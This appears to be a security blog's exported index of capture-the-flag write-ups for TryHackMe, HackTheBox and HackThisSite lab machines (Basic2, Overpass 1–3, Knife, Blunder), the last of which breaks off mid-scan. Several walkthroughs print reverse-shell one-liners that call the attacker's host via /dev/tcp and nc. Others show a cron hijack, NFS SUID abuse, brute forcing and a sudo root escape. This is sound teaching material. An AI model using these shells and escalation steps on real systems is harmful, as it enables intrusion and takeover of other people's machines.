2022-03-14T15:54:18|_ start_date: N/A| smb2-security-mode:| 3.1.1:|_ Message signing enabled but not requiredWe found about 6 open port. 22 SSH 80 HTTP 139/445 Samba 8009 ajp13 8080 HTTPWebPageLet’s navigate to the webpage on port 80.Checking the source code we see a comment.GobusterLet’s run a directory scan using the following command: gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{target_IP}Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.226.39[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================12:22:10 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 291]/.htpasswd (Status: 403) [Size: 296]/.htaccess (Status: 403) [Size: 296]/development (Status: 301) [Size: 318] [--&gt; http://10.10.226.39/development/]/index.html (Status: 200) [Size: 158] /server-status (Status: 403) [Size: 300] ===============================================================We found /development directory, let’s see what there.The decelopment directory has two text files in it.Let’s read the dev.txt text file.It seems that this is the dev note we say earlier, we also notice J and K at the end of every note.Let’s check the j.txt file.It looks like it’s a message for J noting that the password the latter uses is weak, and it’s from K.SMBLet’s now enumerate samba using Enum4linux with -A option for all simple enumeration, and it will enumerate for : users, groups, shares…etc.Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon May 24 07:04:30 2021 ==========================| Target Information | ==========================Target ........... 10.10.40.158RID Range ........ 500-550,1000-1050Username ......... ''Password ......... ''Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ====================================================| Enumerating Workgroup/Domain on 10.10.40.158 | ====================================================[+] Got domain/workgroup name: WORKGROUP ============================================| Nbtstat Information for 10.10.40.158 | ============================================Looking up status of 10.10.40.158\tBASIC2 &lt;00&gt; - B &lt;ACTIVE&gt; Workstation Service\tBASIC2 &lt;03&gt; - B &lt;ACTIVE&gt; Messenger Service\tBASIC2 &lt;20&gt; - B &lt;ACTIVE&gt; File Server Service\t..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Master Browser\tWORKGROUP &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Domain/Workgroup Name\tWORKGROUP &lt;1d&gt; - B &lt;ACTIVE&gt; Master Browser\tWORKGROUP &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Browser Service Elections\tMAC Address = 00-00-00-00-00-00 =====================================| Session Check on 10.10.40.158 | =====================================[+] Server 10.10.40.158 allows sessions using username '', password '' ===========================================| Getting domain SID for 10.10.40.158 | ===========================================Domain Name: WORKGROUPDomain Sid: (NULL SID)[+] Can't determine if host is part of domain or part of a workgroup ======================================| OS information on 10.10.40.158 | ======================================[+] Got OS info for 10.10.40.158 from smbclient:[+] Got OS info for 10.10.40.158 from srvinfo:\tBASIC2 Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu\tplatform_id :\t500\tos version :\t6.1\tserver type :\t0x809a03 =============================| Users on 10.10.40.158 | ============================= =========================================| Share Enumeration on 10.10.40.158 | =========================================lpcfg_do_global_parameter: WARNING: The \"client use spnego\" option is deprecatedlpcfg_do_global_parameter: WARNING: The \"client ntlmv2 auth\" option is deprecated\tSharename Type Comment\t--------- ---- -------\tAnonymous Disk \tIPC$ IPC IPC Service (Samba Server 4.3.11-Ubuntu)Reconnecting with SMB1 for workgroup listing.\tServer Comment\t--------- -------\tBASIC2 Samba Server 4.3.11-Ubuntu\tWorkgroup Master\t--------- -------\tWORKGROUP BASIC2[+] Attempting to map shares on 10.10.40.158//10.10.40.158/Anonymous\tMapping: OK, Listing: OK//10.10.40.158/IPC$\t[E] Can't understand response:lpcfg_do_global_parameter: WARNING: The \"client use spnego\" option is deprecatedlpcfg_do_global_parameter: WARNING: The \"client ntlmv2 auth\" option is deprecatedNT_STATUS_OBJECT_NAME_NOT_FOUND listing \\* ====================================================| Password Policy Information for 10.10.40.158 | ====================================================[+] Attaching to 10.10.40.158 using a NULL share[+] Trying protocol 139/SMB...[+] Found domain(s):\t[+] BASIC2\t[+] Builtin[+] Password Info for Domain: BASIC2\t[+] Minimum password length: 5\t[+] Password history length: None\t[+] Maximum password age: 37 days 6 hours 21 minutes\t[+] Password Complexity Flags: 000000\t\t[+] Domain Refuse Password Change: 0\t\t[+] Domain Password Store Cleartext: 0\t\t[+] Domain Password Lockout Admins: 0\t\t[+] Domain Password No Clear Change: 0\t\t[+] Domain Password No Anon Change: 0\t\t[+] Domain Password Complex: 0\t[+] Minimum password age: None\t[+] Reset Account Lockout Counter: 30 minutes\t[+] Locked Account Duration: 30 minutes\t[+] Account Lockout Threshold: None\t[+] Forced Log off Time: 37 days 6 hours 21 minutes[+] Retieved partial password policy with rpcclient:Password Complexity: DisabledMinimum Password Length: 5 ==============================| Groups on 10.10.40.158 | ==============================[+] Getting builtin groups:[+] Getting builtin group memberships:[+] Getting local groups:[+] Getting local group memberships:[+] Getting domain groups:[+] Getting domain group memberships: =======================================================================| Users on 10.10.40.158 via RID cycling (RIDS: 500-550,1000-1050) | =======================================================================[I] Found new SID: S-1-22-1[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869[I] Found new SID: S-1-5-32[+] Enumerating users using SID S-1-5-32 and logon username '', password ''...S-1-5-32-1050 *unknown*\\*unknown* (8)[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''S-1-5-21-2853212168-2008227510-3551253869-500 *unknown*\\*unknown* (8).....S-1-5-21-2853212168-2008227510-3551253869-1050 *unknown*\\*unknown* (8)[+] Enumerating users using SID S-1-22-1 and logon username '', password ''S-1-22-1-1000 Unix User\\kay (Local User)S-1-22-1-1001 Unix User\\jan (Local User) =============================================| Getting printer info for 10.10.40.158 | =============================================No printers returned.enum4linux complete on Mon May 24 07:13:07 2021At the end of the enumeration, we were able to find 2 usernames, Kay and Jan.FootholdWith the information we have now, we can see that the note in j.txt file we read earlier was from kay to jan. We know that Jan’s password is weak, so let’s use hydra to brute force the password on ssh.Great! We got jan’s password, let’s ssh to the machine as jan.Privilege EscalationLet’s do some basic enumeration on the machine.We found kay’s home directory, it contains a file called pass.bak but we can’t read it, but it also has .ssh directory, and inside it there a readable private key, let’s copy the private key and put it in our machine and connect with it.The private key is protected with a password, we can use ssh2john and try to crack that password.Now that we got the pass let’s ssh to the machine as kay using the private key.Let’s see if we can get root.Great! Kay have the permission to run anything on the machine as root so it was easy to get root.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "HackThisSite - Basic mission 2", "url": "/posts/HTS-Basic2/", "categories": "HackThisSite, Basic missions", "tags": "hackthissite, hts, easy, web, basic, html", "date": "2022-03-09 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing basic mission 2 from HackThisSiteSolutionLet’s navigate to the challenge page.Sam didn’t upload the password file, but the script will still work, it’s going to take the password we supply and compare it to nothing, since it’s not going to find the file. So we can just press the submit button and get in.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "HackThisSite - Basic mission 1", "url": "/posts/HTS-Basic1/", "categories": "HackThisSite, Basic missions", "tags": "hackthissite, hts, easy, web, basic, html", "date": "2022-03-09 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing basic mission 1 from HackThisSiteSolutionNavigating to the challenge page we see the following:We need to submit a password, let’s check the source code of the page and see if we can find something, we can do that by pressing ctrl+U or by right click -&gt; View Page Source.We got the password, now copy it and submit it and let’s move to level 2.The reason behind this challenge is that sometimes, developers put notes, hidden pages for the Webapp or even usernames and password as html comments while they develop the Webapp, and they forget to remove them after they finish, so it’s worth checking the source code.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "TryHackMe - Overpass3", "url": "/posts/overpass3/", "categories": "TryHackMe", "tags": "tryhackme, linux, cryptography, gpg, hydra, reverse-shell, ftp, tunneling, nfs, suid", "date": "2022-03-07 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. We are doing Overpass 3 from TryHackMe, it is the third and the last machine from the Overpass series. The difficulty of the machine is medium, we start by enumerating the webserver, we find credentials for ftp, and use the latter to upload a reverse shell to get access to the machine, we use linpeas after that to discover possible privilege escalation vector.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressice scan to provide faster results. Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 05:20 ESTNmap scan report for 10.10.19.166Host is up (0.12s latency).Not shown: 985 filtered tcp ports (no-response), 12 filtered tcp ports (admin-prohibited)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.0 (protocol 2.0)| ssh-hostkey:| 3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)| 256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)|_ 256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)80/tcp open http Apache httpd 2.4.37 ((centos))|_http-title: Overpass Hosting| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.37 (centos)Service Info: OS: UnixService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 21.87 secondsWe see 3 open ports, no anonymous login for ftp, and we have no credentials for ssh, let’s enumerate the webserver.webserverNothing interesting.gobusterLet’s enumerate the webpage for files and directories. gobuster dir -w /usr/share/wordlists/dirb/big.txt -u {target_IP}===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.19.166/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php,txt[+] Timeout: 10s===============================================================2022/02/26 05:22:25 Starting gobuster in directory enumeration mode===============================================================/.htpasswd (Status: 403) [Size: 218]/.htpasswd.php (Status: 403) [Size: 222]/.htpasswd.txt (Status: 403) [Size: 222]/.htaccess (Status: 403) [Size: 218]/.htaccess.php (Status: 403) [Size: 222]/.htaccess.txt (Status: 403) [Size: 222]/backups (Status: 301) [Size: 236] [--&gt; http://10.10.19.166/backups/]/cgi-bin/ (Status: 403) [Size: 217] ===============================================================We found a /backups directory, and inside it is a backup.zip file, let’s download it and unzip it to see what’s inside it.The backup file contains a gpg encrypted xlsx cheat and a private key, we can decrypt that file using the key.We managed to decrypt the file, now let’s open it and see if it has anything useful.The cheat has usernames and passwords as well as other information. Let’s create a file that contains usernames and a file that contains password. We can’t use ssh with those credentials, so let’s try them with ftp, i will use hydra to brute force the username and password for ftp.Let’s now login to ftp using those credentials.We see an index.html file and backups directory that we found earlier, it seems that we are in the webserver’s directory, and we have write permissions on it, let’s upload a php reverse shell.Great! We managed to upload the file.FootholdAfter uploading the reverse shell file, let’s set up a listener on our machine and browse to our shell on http://{target_IP}/reverse.phpWe are in the machine, we can stabilize our shell using the python pty trick.If we list the content of /home directory, we see that we have paradox and james, since we have paradox’s password, let’s try change our current user to him and see if it workNice! we managed to change user to paradox, but there is not much we can do.Privilege EscalationLet’s run linpeas to see if there something we can do to escalate our privileges.There is an nfs share with no_root_squash permissions. I visited the url provided with this nfs misconfiguration to learn how to exploit it. After a little bit of reading, it seems we need to mount that share to our attacking machine, put a copy of /bin/bash in james directory and give it SUID permissions on our machine, and we can move back to the compromised machine and become root, if it doesn’t make any sense now, don’t worry, we will go step by step.First, we need to mount the share, but when we scanned the machine earlier with nmap, it didn’t give us any nfs service running, that is because it is only available locally, what we can do is create an ssh tunnel that permits us to connect to services in the target machine as if it was available remotely. NOTE: For more information about tunneling and port forwarding, i recommend doing Wreath network.For this, i will be using sshuttle to create the tunnel, but we need an ssh connection first to use it. To solve that, i copied my ssh public key and added it to the authorized_keys file in .ssh directory, now i can connect with ssh to paradox without providing a password.Now we can use sshuttle to create the tunnel.To see if things work, we can list the available shares in the target machine using showmount -e {target_IP} and it should give us /home/james.We should after create a directory for the share and mount it using sudo mount -t nfs 10.10.19.166:/home/james /tmp/shareNow if we navigated to /tmp/share we should see james home directory.Great! We have james’s home directory in our machine, and if we list his .ssh directory, we can see his private ssh key, let’s make a copy of it and put it our machine, and connect with it.Now that we are logged in as james, let’s copy bash and give it SUID permission. Let’s break that into steps: Using the ssh private key of james, connect to james. make a copy of bash in home directory. move to the attacking machine and change the owner of bash to root. give SUID permission to bash. move back to james ssh connection, and execute bash as owner (./bash -p)The following screenshots shows the above process.On our attacking machine.On the compromised machine.And just like that we got root.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "TryHackMe - OverPass2", "url": "/posts/overpass2/", "categories": "TryHackMe", "tags": "tryhackme, linux, wireshark, hashcat, crack", "date": "2022-03-05 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. We are doing OverPass 2 - Hacked from TryHackMe, it’s a medium machine where we are given a pcap file to analyze that contains packets captured during an attack, let’s download the file and open it with wireshark.Forensics - PCAP AnalysisWhen we open the pcap file with wireshark, we see a GET request for /development page.The attacker used this page to upload a php reverse shell.We need to follow the tcp stream of the POST request packet to see more information, we can do that by right clicking the POST packet &gt; follow &gt; tcp streamWith that, we can see what payload the attacker has used to get a reverse shell.Looking trought the packets, we see that a new tcp connection is being established right after the attacker has uploaded the php payload.Let’s follow the tcp stream of the 29th packet.We can see what the attacker has executed after gaining a shell, we see that he changed user to james using james’s password. Scrolling down, we see that the attacker cloned a repository from github.we can also see hashes of deferent users.Research - Code AnalysisLet’s navigate to the ssh-backdoor repository on github https://github.com/NinjaJc01/ssh-backdoorClick main.go to see the source code.We can see the default hash for the backdoor.If you scroll down to the bottom of the file we can see the hardcoded salt for the backdoor.Returning to the pcap file where the attacker got into the machine, we can see the hash he used for the backdoor.Using hash-identifier, we see that the hash is sha512We can now copy that hash and add the salt we found earlier to it and try to crack it. the final string will look like this.I will be using hashcat to crack the password, but we need to find the mode to use for sha512 hash.The mode we’ll use is 1710, the final command will look like this : hashcat -m 1710 hash.txt /usr/share/wordlists/rockyou.txtAttack - Get back in!Visiting the webpage, we see that the attacker has changed the face of the website.Let’s now try to get if we look at one of the packets of the pcap file, we can see that the attacker started SSH backdoor on port 2222.We are provided with a hint that tells us that the backdoor only checks the password, so we can only specify the host and the port, provide the password we cracked and get in.We are in, let’s see if we can get root.We moved to james home directory and see that the attacker made a copy of bash owned by root and gave it suid permission, we are able to execute it as root and get root privileges.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "TryHackMe - OverPass", "url": "/posts/overpass/", "categories": "TryHackMe", "tags": "tryhackme, linux, cronjob, web, owasp", "date": "2022-03-03 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. We will be doing OverPass from TryHackMe, it’s an easy machine where we find a login form in a webpage, use Broken Authentication to access the admin page. For the privilege escalation part, we take advantage of a cron job and get a reverse shell with root privileges.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressice scan to provide faster results. Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 06:40 ESTNmap scan report for 10.10.191.99Host is up (0.14s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)| 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)|_ 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: OverpassService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe have 2 open ports, 22(SSH) and 80(HTTP).webpageWhen we visit the site, we see the following:It’s a page about overpass password manager, no other useful information, so let’s start a directory scan: gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://{target_IP}===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.191.99[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/01/31 06:41:39 Starting gobuster in directory enumeration mode===============================================================/aboutus (Status: 301) [Size: 0] [--&gt; aboutus/]/admin (Status: 301) [Size: 42] [--&gt; /admin/]/css (Status: 301) [Size: 0] [--&gt; css/] /downloads (Status: 301) [Size: 0] [--&gt; downloads/]/img (Status: 301) [Size: 0] [--&gt; img/] ===============================================================We found /admin directory, when we visit it, we get a login form:I tried to use some default credentials but it didn’t work, also tried to perform a SQL injection and still got nothing, it’s time now to check the source code.We see that the login is handled by a javascript code, let’s see how it works:The code works as follows, it gets the credentials(username and password) from the user, it send them to /api/login for validation, statusOrCookie now takes the response from the server, if the response is Incorrect credentials, it will not allow access, otherwise, it will set a cookie named SessionToken and redirect us to the admin panel. Here lies the problem, what if we set a cookie with the name SessionToken and refresh the page? On firefox, we can do that by pressing f12 -&gt; storage and click the + sign to add a cookie, we give it the name SessionToken and refresh the page.FootholdGreat, we got access just with that, now we are presented with a SSH private key and a note saying that it belongs to james, we can copy the key and paste it into a file in our machine and use it to connect to the machine as james. We also need to change the permission of file where we copied the key to 600, we can do that with the following command:chmod 600 {filename}. We can now use the following command to connect: ssh -i {filename} {target_IP}. OH, when we try to connect, it tells us to enter a password for the private key and we don’t have one, it’s an easy fix, we can use ssh2john to get a hash and then crack that hash using john:$ ./ssh2john.py {filename} &gt; hash $ john hashUsing default input encoding: UTF-8Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 4 OpenMP threadsProceeding with single, rules:SinglePress 'q' or Ctrl-C to abort, almost any other key for statusAlmost done: Processing the remaining buffered candidate passwords, if any.Proceeding with wordlist:/usr/share/john/password.lstProceeding with incremental:ASCIIja----- (id_rsa) 1g 0:00:00:05 DONE 3/3 (2022-01-31 07:44) 0.1851g/s 262319p/s 262319c/s 262319C/s jamest1..jamelliUse the \"--show\" option to display all of the cracked passwords reliablySession completed.Now that we have the private key’s password, we can connect:$ ssh -i id_rsa james@10.10.191.99Enter passphrase for key 'id_rsa':Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of 12:34:24 UTC 2022 System load: 0.07 Processes: 89 Usage of /: 22.3% of 18.57GB Users logged in: 0 Memory usage: 14% IP address for eth0: 10.10.191.99 Swap usage: 0%47 packages can be updated.0 updates are security updates.Last login: 34:15 2022 from 10.11.31.131james@overpass-prod:~$Privilege EscalationOn james home directory, there is a note that says that there is an automated build script, and we know that we can find information about those in the /etc/crontab file.james@overpass-prod:~$ cat todo.txtTo Do:&gt; Update Overpass' Encryption, Muirland has been complaining that it's not strong enough&gt; Write down my password somewhere on a sticky note so that I don't forget it. Wait, we make a password manager. Why don't I just use that?&gt; Test Overpass for macOS, it builds fine but I'm not sure it actually works&gt; Ask Paradox how he got the automated build script working and where the builds go. They're not updating on the websitejames@overpass-prod:~$ cat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user command17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )# Update builds from latest code* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bashWe find there is an automated command running as root, the command uses curl to call for a bash script, and passes the content of that script to bash, so whatever commands on that file, they will get executed on the machine and by root.What we can do is: change the ip address of overpass to our ip address in /etc/hosts file. Create the same 2 directories and put buildscript.sh in them. Write the desired script you want to run in the buildscrip.sh file. Start a HTTP server using python3 on our machine.james@overpass-prod:~$ vim /etc/hostsjames@overpass-prod:~$ cat /etc/hosts127.0.0.1 localhost127.0.1.1 overpass-prod10.11.31.131 overpass.thm# The following lines are desirable for IPv6 capable hosts::1 ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters┌──(sirius㉿kali)-[~]└─$ mkdir -p downloads/src┌──(sirius㉿kali)-[~]└─$ touch downloads/src/buildscript.sh┌──(sirius㉿kali)-[~]└─$ vim downloads/src/buildscript.sh┌──(sirius㉿kali)-[~]└─$ cat downloads/src/buildscript.sh/bin/bash -i &gt;&amp; /dev/tcp/10.11.31.131/9001 0&gt;&amp;1┌──(sirius㉿kali)-[~]└─$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...I put a command that sends me a root shell, so i will need to set up a listener so get that shell:┌──(sirius㉿kali)-[~]└─$ nc -lnvp 9001 listening on [any] 9001 ...connect to [10.11.31.131] from (UNKNOWN) [10.10.191.99] 51846bash: cannot set terminal process group (3730): Inappropriate ioctl for devicebash: no job control in this shellroot@overpass-prod:~# whoamiwhoamirootroot@overpass-prod:~#Great, we got root.Thank you for taking the time to read my writeup, this was a really fun machine. I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "HackTheBox - Knife", "url": "/posts/Knife/", "categories": "HackTheBox, Machines", "tags": "hackthebox, linux, cve, sudo", "date": "2022-02-21 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Knife from HackTheBox, it’s an easy machine where we find a vulnerable version of php running, use an exploit for that to gain access to the machine, after that, we exploit a binary that we can run as root to gain privileged access.EnumerationnmapAs usual, let’s run a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressice scan to provide faster results. Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 15:44 ESTNmap scan report for 10.10.10.242Host is up (0.26s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)| 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)|_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Emergent Medical Idea|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNmap shows that the machine has 2 open ports: 22(SSH) and 80(HTTP).HTTPLet’s navigate to the webpage.It looks like we have an Emergent Medical Idea application, but there is nothing interesting.GobusterLet’s scan for directories and files using Gobuster.$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.242 ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.10.242[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/01/31 15:50:23 Starting gobuster in directory enumeration mode===============================================================/.htaccess (Status: 403) [Size: 277]/.htpasswd (Status: 403) [Size: 277]/server-status (Status: 403) [Size: 277]===============================================================Nothing interesting here too.wappalyzerLet’s check the web page with Wappalyzer(Wappalyzer is a browser extension that uncovers the technologies used on websites. It detects content management systems, eCommerce platforms, web servers, JavaScript frameworks, analytics tools and many more.)Let’s google these technologies and see if we can find any vulnerability.We found that php 8.1.0-dev has a Remote Code Execution vulnerability, let’s download an exploit and see what we can do.FootholdLet’s run the exploit now.$ python3 php_exploit.py Enter the full host url:http://10.10.10.242/Interactive shell is opened on http://10.10.10.242/Can't acces tty; job crontol turned off.$ whoamijamesGreat! we got a shell as james, but this is not a functional shell, let’s get one by executing a reverse shell command than sends us james shell.rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.10.10 9001 &gt;/tmp/f Note: Change the ip address in the command to yours and set up a listener before executing the command!┌──(sirius㉿kali)-[~]└─$ nc -lnvp 9001 1 ⨯listening on [any] 9001 ...connect to [10.10.17.90] from (UNKNOWN) [10.10.10.242] 41496bash: cannot set terminal process group (1006): Inappropriate ioctl for devicebash: no job control in this shelljames@knife:/$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'python3 -c 'import pty;pty.spawn(\"/bin/bash\")'james@knife:/$ export TERM=xtermexport TERM=xtermjames@knife:/$ ^Zzsh: suspended nc -lnvp 9001┌──(sirius㉿kali)-[~]└─$ stty raw -echo; fg 148 ⨯ 1 ⚙[1] + continued nc -lnvp 9001james@knife:/$Now we have a fully functional shell.Privilege EscalationLet’s check what can we run as root.james@knife:~$ sudo -lMatching Defaults entries for james on knife: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser james may run the following commands on knife: (root) NOPASSWD: /usr/bin/knifeWe can run knife as root. We google knife binary and we find this Documentation. When we look at the subcommands we see exec.With exec sub command, we can run ruby scripts. and with our ability to run knife as root, we can give it a ruby script that drops us a root shell.exec \"/bin/bash\"james@knife:~$ sudo knife execAn interactive shell is openedType your script and do:1. To run the script, use 'Ctrl D'2. To exit, use 'Ctrl/Shift C'Type here a script...exec \"/bin/bash\"root@knife:/home/james# whoamirootroot@knife:/home/james#Great! We became root now.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "HackTheBox - Blunder", "url": "/posts/blunder/", "categories": "HackTheBox, Machines", "tags": "hackthebox, linux, cve, metasploit, bruteforce, crack", "date": "2022-02-17 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we will be doing Blunder from HackTheBox. Blunder is an easy box, we enumerate open ports, we find a webserver that is running a vulnerable CMS, we do some enumeration to find a username and use cewl to generate a password list. After that we manage to get some valid credentials, we move to metasploit and use a module that gives us a reverse shell. We enumerate the webserver files and find a password hash of hugo. After cracking the hash and switching to hugo, we see hugo can run bash as any user exept root, we exploit the old version of sudo running on the machine and get root.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressice scan to provide faster results. Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-01 12:24 ESTNmap scan report for 10.10.10.191Host is up (0.12s latency).Not shown: 998 filtered tcp ports (no-response)PORT STATE SERVICE VERSION21/tcp closed ftp80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Blunder | A blunder of interesting facts|_http-generator: Blunder|_http-server-header: Apache/2.4.41 (Ubuntu)Nmap shows 1 open ports 80(HTTP)WebPageWhen we browse to port 80, we have what appears to be a blog. Looking at the content and the source code the the page, nothing really stands out.GobusterLet’s enumerate for directories and files with Gobuster.$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.191 -x php,txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.10.191[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php,txt[+] Timeout: 10s===============================================================2022/02/01 12:41:40 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 277]/.hta.php (Status: 403) [Size: 277]/.hta.txt (Status: 403) [Size: 277]/.htaccess (Status: 403) [Size: 277]/.htpasswd (Status: 403) [Size: 277]/.htaccess.php (Status: 403) [Size: 277]/.htpasswd.php (Status: 403) [Size: 277]/.htaccess.txt (Status: 403) [Size: 277]/.htpasswd.txt (Status: 403) [Size: 277]/0 (Status: 200) [Size: 7562]/about (Status: 200) [Size: 3281]/admin (Status: 301) [Size: 0] [--&gt; http://10.10.10.191/admin/]/cgi-bin/ (Status: 301) [Size: 0] [--&gt; http://10.10.10.191/cgi-bin]/install.php (Status: 200) [Size: 30] /LICENSE (Status: 200) [Size: 1083] /robots.txt (Status: 200) [Size: 22] /robots.txt (Status: 200) [Size: 22] 